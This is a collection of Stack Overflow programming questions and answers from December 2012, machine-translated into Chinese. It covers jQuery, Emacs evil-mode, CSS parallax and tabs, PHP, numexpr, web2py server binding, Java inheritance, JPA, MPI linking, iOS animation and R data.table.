    $("#sortable2 li[id]").each(function(index) {           
        entry_length = $(this).children('span[id^="etime"]').attr('lang');

        m=m+entry_length;

        $(this).children('span[id^="etime"]').text(m);
    });
} 
```

任何帮助将非常感激！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T03:22:57.513

使用`data-*`属性（HTML5 天赐良机），它可以让它更简单：

```
<ul id="sortable2">
//...
<?php
$performance_title = strtoupper($performance_title);
$step2 .= <<<HTML
  <li data-time='{$e['entry_id']}' data-length='{$length}' class='cat entry'>
    <span class='entry_time'></span>
    $performance_title
  </li>
HTML;
?>
//...
</ul> 
```

```
function createDanceTimes() {   
  var start_time = new Date();

  start_time.setHour(8);
  start_time.setMinute(0);

  $("#sortable2 li[data-time]").each(function(index) {           
    var 
      $this = $this;

    start_time.setMinute(start_time.getMinute() + parseInt($this.data('length'), 10));

    $(this).find('span.entry_time').text((start_time.getHour()) + ':' + (start_time.getMinute())); // this will deal with minutes that get past 60, and will convert to a new hour automatically
  });
} 
```

由于我不知道您当前使用的格式是什么，所以我只是在尝试我的最佳猜测

# emacs - 安装 Emacs 邪恶。我该如何启动它？

> ID：13756125
> 
> 赞同：14
> 
> 时间：2012-12-07T02:36:34.790
> 
> 标签：emacs, elpa

只是出于好奇，我想尝试一下 emacs + evil。这是我到目前为止所做的：

*   在 Windows 7 上安装了 emacs 24——进展顺利

*   `C:\Users\name\AppData\Roaming\`在（ .emacs.d 结束的地方）创建了一个 .emacs 文件

*   将以下内容添加到该 .emacs 文件中

```
 (setq package-archives '(("ELPA" . "http://tromey.com/elpa/")
                             ("gnu" . "http://elpa.gnu.org/packages/")
                             ("marmalade" . "http://marmalade-repo.org/packages/"))) 
```

*   然后开始了emacs`M-x` `package-list-packages`

*   选择`evil`, `evil-leader`,然后安装`evil-numbers`_`i``x`

*   重新启动emacs

Evil 显示为安装在 package-list-packages 中，并且 evil 文件存在于 中`.emacs.d\elpa`，但是当我启动 emacs 时似乎没有加载 evil（`<N>`状态栏中为否）。

只是从 emacs 开始。除了发出很多哔哔声外，没有办法从中得到太多。希望从简单开始并使用几天，然后再进行进一步的扩展。

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2012-12-07T03:48:46.303

You should add following s-expressions to your .emacs.

```
(package-initialize)
(evil-mode 1)        ;; enable evil-mode 
```

# css - 视差图像加载正常，但悬停时会跳到中心

> ID：13756128
> 
> 赞同：2
> 
> 时间：2012-12-07T02:36:46.457
> 
> 标签：css, header, background-image, centering, parallax

我有一个我今天一直在尝试修复的特殊错误——仍然没有运气。如果你看下面的例子，

[http://vitaliyg.com/alpha/hire/](http://vitaliyg.com/alpha/hire/)

这就是发生的事情。全角背景图像加载到正确的位置，沿 y 轴居中。然后，当我们将鼠标悬停在图像上时，整个图像会跳到中间，并慢慢调整自己回到正常所需的位置。

这是什么原因造成的`left: 50%; margin-left: -960px;`。这使我们能够正确地将图像居中。如果我们没有这个 CSS，悬停就不会跳跃，但图像会加载并锚定在浏览器的左上角。

在上面的链接中，红框是内容 div。蓝色框是一些将与`background-image`.

这是我想要实现的目标：

1.  使`background-image`显示居中。
2.  当用户将鼠标悬停在 上时`background-image`，它不会跳转到页面中间。
3.  最后，减小用户能够在 x 轴上“视差”的宽度。现在的情况是，如果有足够的耐心，用户可以从一侧看到图像。我希望视差非常微妙。

另外，我正在使用 jParallax，在这里找到：
[http ://stephband.info/jparallax/](http://stephband.info/jparallax/)

谢谢您的帮助！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-07T08:43:13.870

一旦你通过 CSS 为背景图像设置了位置，jQuery Parallax 插件似乎会改变这些设置。然后解决方案是在 jQuery Parallax 处理完该视差层之后应用这些设置。

首先，从您的班级中删除`margin-left`and 。`left``.parallax-layer#background`

```
.parallax-layer#background {
  background-image: url('../images/bg.jpg');
  background-repeat: no-repeat;
  background-position: center bottom;
  width: 1920px;
  height: 620px;
} 
```

理想情况下，使用相同的方法将蓝色框居中（除非您希望它部分离开屏幕）。我还根据您的 HTML 删除了非必要的 CSS。

```
.parallax-layer#tagline {
  background-color: blue;
  width: 400px;
  height: 400px;
} 
```

最后，添加从**背景**和**标语**选择器中删除的 CSS 规则，以便在 jQuery Parallax 操作这些项目后应用它们。

```
jQuery(document).ready(function(){
    jQuery('#parallax .parallax-layer')
    .parallax({
        mouseport: jQuery('body')
    });
  jQuery('#background').css({marginLeft: "-960px", left: "50%", bottom: "0px"});
  jQuery('#tagline').css({marginLeft: "-200px", left: "50%"});
}); 
```

当鼠标进入视口时，您将不再看到背景图像左侧的大白色部分（主体背景颜色）。

这个**jQuery Parallax**插件按设计将所有内容对齐顶部/左侧。如果鼠标从蓝色框的右侧进入视口，则该框将正确动画到该位置。

但是，如果鼠标从蓝色框的左侧进入，该框将“跳转”到光标位置。您可能会考虑删除上面的最后一个 jQuery 行，以便在浏览器加载时蓝色框位于顶部/左侧，或者使用较低的百分比值，例如**`25%`**.

* * *

对于那些登陆这个问题/答案并希望使用一些真正的标记的人，我已经设置了两个 jsFiddles。一个 jsFiddle 重复了这个问题，另一个有如上所示的解决方案。

[**原始问题 - jsFiddle 已**](http://jsfiddle.net/UG4Sq/embedded/result/)
[**修复应用 - jsFiddle**](http://jsfiddle.net/UG4Sq/1/embedded/result/)

两个 jsFiddles 都处于全屏模式，因此可以看到视差效果。

**查看原始问题的说明：**
**1.**启动上面的原始问题 jsFiddle 链接。
**2.**按下jsFiddle播放按钮，注意不要进入视口。如果蓝色框以任何方式移动...您已进入视口，请再次按下播放按钮。
**3.**从视口的顶部/左侧进入，您将看到问题...... HTML Body（白色）被视为背景图像重新调整自身。
**4.**随时按播放按钮重置网页。

要查看已修复的应用程序，请启动上面的链接或在浏览器地址栏中修改 URL，以便您看到该 jsFiddle 的修订版 1。（即，`http://jsfiddle.net/UG4Sq/1/embedded/result/`）

蓝色框通过文本指示您查看的 jsFiddle。干杯!

# sql - 使用 SQL 测试 CSV 值的有效性

> ID：13756141
> 
> 赞同：1
> 
> 时间：2012-12-07T02:38:49.060
> 
> 标签：sql, sql-server-2008, csv, concatenation, duplication

我试图围绕如何针对其父数据库测试 CSV 文件中的键值。

我有一个包含地址值的表，每条记录都有一个数字键。该表有许多重复项，每个重复项都有一个唯一的键。

我有一个程序，该程序已复制并将它们指向一个“父”键，以移交可能与该键相关的任何关系。

例子：

```
Key  StreetNo   StreetName   Unit
---  --------   ----------   ----
2     123        5th          
8     123        5th          A
1     123        5th 
```

这将在我的 CSV 文件中：2、8、1

请注意，我只查看 StreetNo 和 StreetName。此外，有许多重复的实例，下一个 CSV 行可能类似于 4、5、6、9、11

我需要测试此文件的准确性，以确保地址不会指向错误地址的父级。我只想测试 StreetNo 和 Name。

我知道我可以使用 SQL 读取 CSV，但是我的 CSV 列会有所不同。正确的方法是获取 CSV 中的第一个键，连接 StreetNO 和 StreetName，存储它，然后将其与其余键的连接值进行比较。重复 CSV 的长度。

例子：

```
CSV 2, 8, 1

2 = "123 5th"; check against "123 5th", "123 5th" 
```

如果没有匹配，将打印 CSV 行。

我处于停顿状态，有没有人接触过这种类型的动态 CSV 测试 - 逻辑很简单，但我坚持实施。

# php - PHP 邮件代码不会发送正确的字符

> ID：13756145
> 
> 赞同：0
> 
> 时间：2012-12-07T02:39:19.373
> 
> 标签：php

很抱歉打扰你，但我已经编写了这段代码，它更长，但我做到了，因为这是不会发送正确内容的部分

```
 <?php
    mail('mitchg345@yahoo.com', "Welcome!", "Welcome", "FROM: Mitch");
    echo "Good";
    ?> 
```

From 一直说它来自“Nobody”，但来自“Welcome！” 部分工作，但之后不起作用。请帮忙！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T03:01:04.627

试试这个：[PHP 邮件](http://php.net/manual/en/function.mail.php)

```
if(mail('mitchg345@yahoo.com', 'Subject', 'Message', 'From: Mitch <mitchg345@yahoo.com>'))
{
    echo 'Sent';
} 
```

# python - Numexpr 错误：“a = global_dict[name]”

> ID：13756148
> 
> 赞同：2
> 
> 时间：2012-12-07T02:39:47.983
> 
> 标签：python, numexpr

我正在尝试使用 Numexpr 制作一个快速的[Vector Norm](http://mathworld.wolfram.com/VectorNorm.html "向量范数函数")函数来与[Numpy's](http://docs.scipy.org/doc/numpy/reference/generated/numpy.linalg.norm.html)进行比较。我尝试以下方法：

```
import numexpr as ne
import numpy as np

def L2_Norm(vector_in):
    vector1 = ne.evaluate("abs(vector_in)")
    vector2 = ne.evaluate("vector1**2")
    vector3 = ne.evaluate("sum(vector2)")
    vector_out = ne.evaluate("sqrt(vector3)")
    return vector_out`

ve = np.arange(10)
L2_Norm(ve) 
```

我明白了：

```
File "C:\Folder1\Folder2\src\test.py", line 11, in L2_Norm
  vector3 = ne.evaluate("sum(vector2)")<br>
File "C:\Python27\lib\site-packages\numexpr\necompiler.py", line 701, in evaluate
  a = global_dict[name]<br>
KeyError: 'a' 
```

我基本上遵循了他们[用户指南](http://code.google.com/p/numexpr/wiki/UsersGuide)中的相同步骤（这似乎是唯一的参考）。我唯一的线索是：

> umexpr 的主要程序是这样的：
> `evaluate(ex, local_dict=None, global_dict=None, **kwargs)`
> 
> 其中 ex 是形成表达式的字符串，例如“2*a+3*b”。a 和 b 的值默认取自调用函数的框架（通过使用 sys._getframe()）。或者，它们可以使用 local_dict 或 global_dict 参数指定，或作为关键字参数传递

......我不太明白 - 我认为作者保持简单，因为包很简单。我忽略了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-14T22:47:34.793

原来“local_dict=None, global_dict=None”参数毕竟不是默认的。您需要专门将它们添加到您的`numexpr.evaluate`函数中。

# android-intent - GCM 活动未作为次要活动开始

> ID：13756150
> 
> 赞同：1
> 
> 时间：2012-12-07T02:40:09.153
> 
> 标签：android-intent

我如何开始使用 GCM 作为意图的活动？因为如果我从意图启动类，应用程序就会停止/冻结。但如果我将课程作为主要活动运行，它就可以正常工作。

Intent intent = new Intent(this, GameActivity.class); 开始活动（意图）；

# macos - PPT:objective-c 检索当前幻灯片标题

> ID：13756153
> 
> 赞同：1
> 
> 时间：2012-12-07T02:40:21.743
> 
> 标签：macos, powerpoint

我尝试在Mac中设置PPT自动翻页时检索当前幻灯片标题，但我不知道该怎么做，请帮助我。

# python - web2py - 允许外部访问 - 如何？

> ID：13756154
> 
> 赞同：11
> 
> 时间：2012-12-07T02:40:25.843
> 
> 标签：python, web2py

我想启动一个 web2py 服务器，以便可以从外部访问托管服务器。

我读过这个 [http://web2py.com/books/default/chapter/29/03](http://web2py.com/books/default/chapter/29/03)

> 默认情况下，web2py 在 127.0.0.1:8000（本地主机上的端口 8000）上运行其 Web 服务器，但您可以在任何可用的 IP 地址和端口上运行它。您可以通过打开命令行并在 Windows 上键入 ipconfig 或在 OS X 和 Linux 上键入 ifconfig 来查询网络接口的 IP 地址。从现在开始，我们假设 web2py 在 localhost (127.0.0.1:8000) 上运行。**使用 0.0.0.0:80 在您的任何网络接口上公开运行 web2py**。

但我找不到如何“使用 0.0.0.0:80”？似乎没有命令行参数可以做到这一点。

谢谢

* * *

**编辑**：我应该说有问题的服务器没有 GUI - 我知道 web2py 有一些基于 GUI 的管理设施，但这在这里是不可能的。

* * *

**EDIT2**：以防万一这不清楚（并且在偶然情况下它会产生任何影响 - 我对此表示怀疑）我正在像这样运行服务器：

```
sudo python web2py.py 
```

*不是*通过 wsgi/apache 之类的。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-12-07T03:59:53.150

```
python web2py.py --ip 0.0.0.0 
```

工作正常，但日志消息会将您指向无效地址：

```
please visit:
    http://0.0.0.0:8000 
```

或者，您可以使用以太网接口 ip，但它也不会在 localhost 上侦听

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-07T10:24:54.847

可能对您有所帮助的是，当服务器 gui 弹出询问管理员密码时，您可以选择公共 ip。

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2017-04-10T09:28:22.837

在终端中执行以下操作

```
install ufw with apt
add 8000 to firwall.
ufw allow 8000/tcp
ufw allow 8000/tcp 
```

导航到您下载的 web2py 所在的位置并 cd web2py

使用 nano serverstartup.sh 并添加以下行

```
python2.7 web2py.py -a 'Server admin passwrod' -c server.crt -k server.key -i your device IP address -p 8000 
```

将服务器管理员密码更改为您选择的任何密码。

```
chmod +x serverstartup.sh

run ./serverstartup.sh in your terminal 
```

这就对了。您可以通过按住键盘上的 control 和 c 键来停止服务器。

# java - Java 继承

> ID：13756160
> 
> 赞同：-2
> 
> 时间：2012-12-07T02:41:13.347
> 
> 标签：java, oop, inheritance

我正在为作业编写一个简单的 Java 程序，它使用继承实现了一个库系统。我有一个名为 Entry 的类和另外两个扩展它的类（书籍和期刊）。

一切正常。

现在我必须创建一个将测试整个程序的类。这个类应该使用一个数组来存储元素（我想在系统中添加的书籍或期刊）。我不知道我要添加多少元素，但我必须为他们声明一个数组（我的条目将是书或日记）。我的问题是：这个数组应该是一个条目数组（我想），如果是，例如我想添加一本书额外的元素那本书有会存放在哪里？

先感谢您。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T02:46:07.310

是的，您应该添加到`Entry`数组中。您可以将`Book`实例添加到`Entry`数组中，因为它正在扩展`Entry`. `Book`要在从数组中获取它后访问其属性或方法`Entry`，您必须将其强制转换为`Book`.

```
Entry[] entries = new Entry[5];
entries[0] = new Book();
Book aBook = (Book)entries[0];
aBook.getBookTitle(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-07T02:46:18.707

您应该为 Entry 声明此数组

```
Entry array[] = new Entry[10];
array[0] = new book();
array[1] = new journal(); 
```

这工作得很好。

在java中，变量中没有实际的对象，而是指向它的指针，这就是为什么你需要创建***新的对象***，它要求它为所述对象提供所需的内存。

# css - 如何在 div 中保留 div

> ID：13756162
> 
> 赞同：0
> 
> 时间：2012-12-07T02:41:16.110
> 
> 标签：css, html, hyperlink

请帮忙！

这是我到目前为止所拥有的：http: [//beauxlent.com/nicole](http://beauxlent.com/nicole) 当您单击“一”、“二”或“三”时，它会将您带到仍在同一页面上的 div。但是，我希望 div 保持在正确的 div 内，并且仍然在使用 #tags 的同一页面上。我以前见过这样做。

```
<style type="text/css">
 {    
padding: 0;
margin: 0;
}
body {
text-align: justify;
overflow: hidden;
background: #F8F8F8;
font: -blocked- arial;
}
table, p {
display: none;
}
div {
width: 100%;
}

.container {width: 800px; display:block; margin:0px auto}

.left {width:200px; float:left; background: #eee; display:block; height:200px; 
line-        height:2}

.right {width:600px; float:right; background: #808080; display:block; height: 200px; 
line-height:2; }

#o {position:absolute; right: 2000px;}

.blog {
background: 0;
position: absolute;
top: 150px;
left: 500px;
width: 290px;
height: 140px;
}
#omg { 
z-index: 7;
position: absolute;
top: 1000px;
right: 0;
color: #000;
height: 1000px;
}
#plz {

z-index: 7;
position: absolute;
top: 9000px;
right: 0;
color: #000;
height: 9000px;
}

}
#nande a:hover {
color: #000;
}
#nande {

z-index: 7;
position: absolute;
top: 7000px;
right: 0;
color: #000;
height: 1000px;
}
body, table {
color: #fff;
}
font, table, tr, td, br, p {
font: -blocked- franklin gothic medium;
color: #fff;
}
#content {
width: 100%;
    }
#main, #content {
border: 0px none;
background: #fff;
}

}

.framed {
background: #fff;
padding: 5px;

overflow: auto;
position: absolute;
top: 20px;
left: 0px;
}

</style>
<div id="boxed">

<div class="container">

<div class="left">

<a href="#uno" class="big">1</a>

<a href="#dos" class="big">2</a>

<a href="#tres" class="big">3</a>

</div>

<div class="right">

<div id="omg">
<a name="uno"></a>
<div class="framed">
 one
</div>

</div>

<div id="nande">
<a name="dos"></a>
<div class="framed">
 two
</div>
</div>

<div id="plz">
<a name="tres"></a>
<div class="framed">

three
</div>
</div>

</div> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T02:54:47.023

你的意思是标签。这也可以在 CSS 中完成。尝试在这里检查 -> [http://css-tricks.com/functional-css-tabs-revisited/](http://css-tricks.com/functional-css-tabs-revisited/)

HTML 代码：

```
 <div class="tab">
       <input type="radio" id="tab-1" name="tab-group-1" checked>
       <label for="tab-1">Tab One</label>

       <div class="content">
           stuff
       </div> 
   </div>

   <div class="tab">
       <input type="radio" id="tab-2" name="tab-group-1">
       <label for="tab-2">Tab Two</label>

       <div class="content">
           stuff
       </div> 
   </div>

    <div class="tab">
       <input type="radio" id="tab-3" name="tab-group-1">
       <label for="tab-3">Tab Three</label>

       <div class="content">
           stuff
       </div> 
   </div>

</div> 
```

CSS 代码：

```
.tabs {
  position: relative;   
  min-height: 200px; /* This part sucks */
  clear: both;
  margin: 25px 0;
}
.tab {
  float: left;
}
.tab label {
  background: #eee; 
  padding: 10px; 
  border: 1px solid #ccc; 
  margin-left: -1px; 
  position: relative;
  left: 1px; 
}
.tab [type=radio] {
  display: none;   
}
.content {
  position: absolute;
  top: 28px;
  left: 0;
  background: white;
  right: 0;
  bottom: 0;
  padding: 20px;
  border: 1px solid #ccc; 
}
[type=radio]:checked ~ label {
  background: white;
  border-bottom: 1px solid white;
  z-index: 2;
}
[type=radio]:checked ~ label ~ .content {
  z-index: 1;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T17:57:18.300

看看[jQuery UI Tabs](http://jqueryui.com/tabs/) - 很容易实现。

**包括**

```
<link rel="stylesheet" href="http://code.jquery.com/ui/1.9.2/themes/base/jquery-ui.css" />
<script src="http://code.jquery.com/jquery-1.8.3.js"></script>
<script src="http://code.jquery.com/ui/1.9.2/jquery-ui.js"></script> 
```

**jQuery**

```
$(function() {
    $( "#tabs" ).tabs();
}); 
```

**的HTML**

```
<div id="tabs">
<ul>
    <li><a href="#tabs-1">Nunc tincidunt</a></li>
    <li><a href="#tabs-2">Proin dolor</a></li>
    <li><a href="#tabs-3">Aenean lacinia</a></li>
</ul>
<div id="tabs-1">
    <p>Proin elit arcu, rutrum commodo, vehicula tempus, commodo a, risus. Curabitur nec arcu. Donec sollicitudin mi sit amet mauris. Nam elementum quam ullamcorper ante. Etiam aliquet massa et lorem. Mauris dapibus lacus auctor risus. Aenean tempor ullamcorper leo. Vivamus sed magna quis ligula eleifend adipiscing. Duis orci. Aliquam sodales tortor vitae ipsum. Aliquam nulla. Duis aliquam molestie erat. Ut et mauris vel pede varius sollicitudin. Sed ut dolor nec orci tincidunt interdum. Phasellus ipsum. Nunc tristique tempus lectus.</p>
</div>
<div id="tabs-2">
    <p>Morbi tincidunt, dui sit amet facilisis feugiat, odio metus gravida ante, ut pharetra massa metus id nunc. Duis scelerisque molestie turpis. Sed fringilla, massa eget luctus malesuada, metus eros molestie lectus, ut tempus eros massa ut dolor. Aenean aliquet fringilla sem. Suspendisse sed ligula in ligula suscipit aliquam. Praesent in eros vestibulum mi adipiscing adipiscing. Morbi facilisis. Curabitur ornare consequat nunc. Aenean vel metus. Ut posuere viverra nulla. Aliquam erat volutpat. Pellentesque convallis. Maecenas feugiat, tellus pellentesque pretium posuere, felis lorem euismod felis, eu ornare leo nisi vel felis. Mauris consectetur tortor et purus.</p>
</div>
<div id="tabs-3">
    <p>Mauris eleifend est et turpis. Duis id erat. Suspendisse potenti. Aliquam vulputate, pede vel vehicula accumsan, mi neque rutrum erat, eu congue orci lorem eget lorem. Vestibulum non ante. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos. Fusce sodales. Quisque eu urna vel enim commodo pellentesque. Praesent eu risus hendrerit ligula tempus pretium. Curabitur lorem enim, pretium nec, feugiat nec, luctus a, lacus.</p>
    <p>Duis cursus. Maecenas ligula eros, blandit nec, pharetra at, semper at, magna. Nullam ac lacus. Nulla facilisi. Praesent viverra justo vitae neque. Praesent blandit adipiscing velit. Suspendisse potenti. Donec mattis, pede vel pharetra blandit, magna ligula faucibus eros, id euismod lacus dolor eget odio. Nam scelerisque. Donec non libero sed nulla mattis commodo. Ut sagittis. Donec nisi lectus, feugiat porttitor, tempor ac, tempor vitae, pede. Aenean vehicula velit eu tellus interdum rutrum. Maecenas commodo. Pellentesque nec elit. Fusce in lacus. Vivamus a libero vitae lectus hendrerit hendrerit.</p>
</div>
</div> 
```

# php - 如何在PHP中的字符串中获取两个字符之间的字符

> ID：13756168
> 
> 赞同：0
> 
> 时间：2012-12-07T02:42:27.393
> 
> 标签：php, string, variables

我有一个文件。每个值如下所示：

```
Peter | Stuart | 10293 | 13/02/93 | email@domain.com | [data6] | [data7] | [data8] 
```

我的问题是，我希望数据 6、7 和 8 位于单独的变量中。

所以变量会是这样的（在 PHP 代码中）

```
$data6 = [data6]
$data7 = [data7]
$data8 = [data8] 
```

那有意义吗？我知道会涉及一个循环，更多的是在“|”之间获取数据 符号我不是 100% 确定。

谢谢彼得

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-07T02:47:01.063

使用 PHP[爆炸](http://php.net/explode)。在这种情况下，您将迭代每一行并通过管道拆分字符串`|`并通过它们的键引用您需要的值，例如`data[6]`将在`explode`like生成的数组的索引 5 中`$data[5]`。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-07T02:47:09.797

你可以使用爆炸：

```
$data_array = explode("|",$your_string); 
```

然后您可以像访问任何其他数组一样访问这些值：

```
$data_array[5]; // this would be data 6 
```

# mysql - JPA @GenerateValue 不在 MySQL 中生成值

> ID：13756171
> 
> 赞同：1
> 
> 时间：2012-12-07T02:42:31.510
> 
> 标签：mysql, eclipse, jpa

我正在设置一个表/实体以在表的第一列中自动生成 int 值，这很可能只是现在在 Eclipse 和 MySQL 中的主键。看起来我已经正确设置了：

```
@Entity
@Table(name="Table")
public class Table implements Serializable {
private static final long serialVersionUID = 1L;

@Id
@GeneratedValue(strategy=GenerationType.IDENTITY)
@Column(unique=true, nullable=false)
private int id; 
```

它可以很好地连接到数据库，并且实际上将值持久化到非 ID 部分。问题是它没有为 id 生成任何东西。mysql 在 id 列中有一个默认值“0”。我没有收到任何错误，它只是用“0”填充列。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T17:20:35.323

当您使用 IDENTITY 生成类型时，您告诉 JPA 数据库将生成 id。因此，您必须设置该列以使用 AUTO_INCREMENT。

# c++ - 在 C++ 程序上使用 mpicc 链接失败

> ID：13756173
> 
> 赞同：6
> 
> 时间：2012-12-07T02:42:44.350
> 
> 标签：c++, compiler-construction, linker, mpi, flags

我正在运行 Ubuntu 11.04 64 位。我已经安装了 OpenMPI。我正在尝试构建以下代码，这是来自 Gropp/Lusk/Skjellum 的“使用 MPI”一书的测试问题的片段：

```
#include <math.h>
#include "mpi.h"

int main(int argc, char *argv[])
{
int size, rank;

    MPI::Init(argc, argv);

    size = MPI::COMM_WORLD.Get_size();
    rank = MPI::COMM_WORLD.Get_rank();

    MPI::Finalize();
    return 0;
} 
```

从终端，我可以使用 mpicc 包装器来检索在我的机器上编译和链接所需的以下信息：

```
$ mpicc --showme:compile
-I/usr/lib/openmpi/include -I/usr/lib/openmpi/include/openmpi -pthread
$ mpicc --showme:link
-pthread -L/usr/lib/openmpi/lib -lmpi -lopen-rte -lopen-pal -ldl -Wl,--export-dynamic -lnsl -lutil -lm -ldl 
```

我可以成功编译代码。但是，**链接失败**。这是我的编译器和链接器步骤：

```
make all 
Building file: ../main.cpp
Invoking: GCC C++ Compiler
mpicc -I/usr/lib/openmpi/include -I/usr/lib/openmpi/include/openmpi -O0 -g3 -Wall -c -fmessage-length=0 -pthread -MMD -MP -MF"main.d" -MT"main.d" -o"main.o" "../main.cpp"
Finished building: ../main.cpp

Building target: test
Invoking: GCC C++ Linker
mpicc -L/usr/lib/openmpi/lib -pthread -Wl,--export-dynamic -o"test"  ./main.o   -lm -ldl -lmpi -lopen-rte -lopen-pal -lnsl -lutil
./main.o: In function `main':
/home/djunderw/ncsu/workspace/test/Debug/../main.cpp:20: undefined reference to `MPI::COMM_WORLD'
/home/djunderw/ncsu/workspace/test/Debug/../main.cpp:21: undefined reference to `MPI::COMM_WORLD'
./main.o: In function `__static_initialization_and_destruction_0':
/usr/include/c++/4.4/iostream:72: undefined reference to `std::ios_base::Init::Init()'
/usr/include/c++/4.4/iostream:72: undefined reference to `std::ios_base::Init::~Init()'
....... 
```

我用`.......`上面来表示错误消息不断出现的事实——其中有很多，但我认为它们没有必要在这里显示。如果是，请询问，我将全部粘贴。

**我怀疑我的链接器标志的顺序不正确。** 另一个线程得出了这个结论：[Link errors while using G++ for MPI code](https://stackoverflow.com/questions/6451340/link-errors-while-using-g-for-mpi-code)。但如果是这样，我无法弄清楚什么是不正常的。

**为什么我的链接失败？**

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-12-07T03:04:17.977

**已解决：** 我更改`mpicc`为`mpic++`，现在它可以工作了。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-02-13T12:48:57.880

您的文件是 .c 文件还是 .cpp 文件。问题是 mpicc 是 c 编译器而 mpic++ 是 c++ 编译器，所以如果你的程序是 ac 程序，我认为不推荐使用 C++ 编译器编译它。

# java - 对特定区域和可以成为任何单词一部分的字母执行查找+替换

> ID：13756174
> 
> 赞同：0
> 
> 时间：2012-12-07T02:42:55.270
> 
> 标签：java, eclipse

我正在 Eclipse 中处理包含地址和电话号码的联系人管理器项目。添加一个（在本例中为树节点）的方法几乎与另一个相同，只是变量和方法说电话而不是地址。例如 getPhoneIterator() 变为 getAddressIterator()。我正在寻找一种方法来突出显示整个段落并将字母“ADDRESS”一起出现的所有地方更改为字母“PHONE”。

有没有办法做到这一点？

为了说明，这是我的代码；

```
// Checking if there are addresses, and 
// then checking and adding them one by one to the tree.
if (!currentContact.addressCollectionIsEmpty()){ //If there are addresses...
    addressMainNode = new DefaultMutableTreeNode("Addresses");
    Iterator<Address> addressItr = currentContact.getAddressIterator();
    while(addressItr.hasNext()){
        Address currentAddress = addressItr.next();
        addressSpecificNode = 
            new DefaultMutableTreeNode(currentAddress.toString());
        addressMainNode.add(addressSpecificNode);
    }
    contactNode.add(addressMainNode);
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T03:11:30.303

```
if (!currentContact.addressCollectionIsEmpty())
{
    addressMainNode = new DefaultMutableTreeNode("Addresses");
    Iterator<Address> addressItr = currentContact.getAddressIterator();
    while(addressItr.hasNext()){
        Address currentAddress = addressItr.next();
        addressSpecificNode = 
            new DefaultMutableTreeNode(currentAddress.toString());
        addressMainNode.add(addressSpecificNode);
    }
    contactNode.add(addressMainNode);
} 
```

上面的代码部分可以移动到一个通用方法中，如下所示：

```
public <T> addToContactNode(
    boolean isEmpty,
    String treeNodeName,
    Iterator<T> itr) 
{
    if (isEmpty) {
        return;
    }
    mainNode = new DefaultMutableTreeNode(treeNodeName);
    while(itr.hasNext()){
        T current = itr.next();
        specificNode = 
            new DefaultMutableTreeNode(current.toString());
        mainNode.add(addressSpecificNode);
    }
    contactNode.add(mainNode);
} 
```

上面的方法会被调用如下：

```
// Add addresses.
addToContactNode(
    currentContact.addressCollectionIsEmpty(),
    "Addresses",
    currentContact.getAddressIterator());

// Add Phones.
addToContactNode(
    currentContact.phoneCollectionIsEmpty(),
    "Phones",
    currentContact.getPhoneIterator()); 
```

# ios - 在视图上实现清晰的缩放动画

> ID：13756176
> 
> 赞同：-1
> 
> 时间：2012-12-07T02:43:07.970
> 
> 标签：ios, uiview, core-animation

我想知道人们如何实现清晰的 UIView 的缩放动画。我在网上的示例代码中注意到，

```
self.frame = CGRectMake(0.0f, 0.0f, 200.0f, 150.0f);
[UIView beginAnimations:@"Zoom" context:NULL];
[UIView setAnimationDuration:0.5];
self.frame = CGRectMake(0.0f, 0.0f, 1024.0f, 768.0f);
[UIView commitAnimations]; 
```

基本上只是改变框架。如果我在 100 x 100 的图像上执行此操作，则图像看起来不清晰。我想知道是否有办法通过缩放使 UIView 变得清晰。当我查看 cocos2d 过渡时，缩放的场景过渡似乎没有任何伪影。一切看起来都很清脆！我想知道这是否是因为 UIView 已经是那个大小，并且它们以较小的尺寸开始视图，所以当它放大到较大的尺寸时，它不会收到不需要的工件。或者，如果他们在 opengl 中做了一些事情，或者让它看起来很清晰。（我不知道opengl，所以如果这个问题完全错误，我道歉！）谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T02:56:05.743

我认为您的代码看起来不错（不过，我认为推荐的动画方法是 now `UIView animate...`）。我觉得可能有两个问题：

1.  您的图像是 100 x 100 并且被放大到全屏。这永远不会看起来很好。（如[本答案](https://stackoverflow.com/a/13756240/377384)中进一步讨论的那样）。

2.  您的比例不会保留（2x1.5 帧中的 1x1 图像）。

同样值得考虑的是您绘制图像的初始大小。如果您有一个 1000x1000 的图像，将其绘制为 500x500，然后将其缩放 2 倍，看起来不如您首先以 1000x1000 绘制，然后将其缩小到 500x500，然后再放大。虽然， UIImageView 属性`UIViewContentModeRedraw`在这里可能会有所帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T02:54:13.247

你给了自己正确的答案：

> 我想知道这是否是因为 UIView 已经是那个大小，并且它们以较小的尺寸开始视图，所以当它放大到较大的尺寸时，它不会收到不需要的工件。

您无法缩放低分辨率图片，并期望它看起来很棒。有一些可能性，例如双三次插值，可以避免像素边界在缩放中被放大，但仍然不清晰。您无法在没有信息的地方创建信息。

# r - 为 data.table 对象编写函数（过程）

> ID：13756178
> 
> 赞同：42
> 
> 时间：2012-12-07T02:43:11.617
> 
> 标签：r, data.table

在《*数据分析软件：使用 R 编程*》一书中，约翰·钱伯斯强调，通常不应为函数的副作用而编写函数；相反，一个函数应该在不修改其调用环境中的任何变量的情况下返回一个值。相反，使用 data.table 对象编写好的脚本应该特别避免使用对象赋值 with `<-`，通常用于存储函数的结果。

